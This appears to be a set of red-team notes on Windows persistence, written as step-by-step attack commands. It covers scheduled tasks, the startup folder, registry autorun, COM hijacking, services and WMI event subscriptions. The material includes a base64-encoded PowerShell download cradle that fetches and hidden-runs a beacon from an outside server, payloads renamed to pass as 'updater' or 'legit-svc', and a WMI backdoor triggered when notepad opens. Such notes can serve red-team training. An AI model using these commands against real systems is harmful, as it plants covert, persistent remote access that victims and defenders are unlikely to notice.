# Host Persistence Notes

## Task Scheduler

Creating a scheduled task that will execute a PowerShell payload once every hour

1. Create an IEX cradle that's base64 encoded, /a is our hosted beacon
   ```
   Windows:
   $str = 'IEX ((new-object net.webclient).downloadstring("http://teamserver.com/a"))'
   [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
   Linux:
   set str 'IEX ((new-object net.webclient).downloadstring("http://teamserver.com/a"))'
   echo -en $str | iconv -t UTF-16LE | base64 -w 0
   ```
2. Execute it on the beacon for persistence
   ```
   execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64 blob>" -n "Updater" -m add -o hourly
   ```
    -t is the desired persistence technique.
    -c is the command to execute.
    -a are any arguments for that command.
    -n is the name of the task.
    -m is to add the task (you can also remove, check and list).
    -o is the task frequency.

## StartUp Folder

Things that start automatically when a user first logs in
```
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64 blob>" -f "UserEnvSetup" -m add
```
-f is the filename to save as

## Registry Autorun

AutoRun values in HKCU and HKLM allow applications to start on boot. 

steps in beacon
```
cd C:\ProgramData
upload C:\Payloads\http_x64.exe
mv http_x64.exe updater.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```
-k is the registry key to modify.
-v is the name of the registry key to create.

## Hunting for COM Hijacks

Easier to hunt for hijacks on our own machine first. Launch procmon64.exe from [sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

We want to filter for
1. RegOpenKey operations
2. where the Result is NAME NOT FOUND
3. and Path ends with InprocServer32

Be important to find a CLSID that isn't loaded often
Example CLSID that we found: HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32

Checking that it exists in HKLM but not in HKCU
```
Get-Item -Path "HKLM:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
```
Now create a registry entry that points HKCU to a Beacon DLL
```
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
Can find hijackable COM in Task Scheduler with this powershell script
```
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```
Review this list for possible exploitation parts by rechecking the HKCU and HKLM like above, and how often they are ran, lik at every user login or something of that nature

# Elevated Host persistence

## Windows Services

Create a new service as an elevated system, this will only run when the system is rebooted
```
cd C:\Windows
upload C:\Payloads\tcp-local_x64.svc.exe
mv tcp-local_x64.svc.exe legit-svc.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

## WMI Event Subscriptions

Can abuse one of these in WMI
-EventConsumer
-EventFilter
-FilterToConsumerBinding

Can use [PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) to abuse these
```
cd C:\Windows
upload C:\Payloads\dns_x64.exe
powershell-import C:\Tools\PowerLurk.ps1
powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

When notepad is opened the DNS beacon will connect
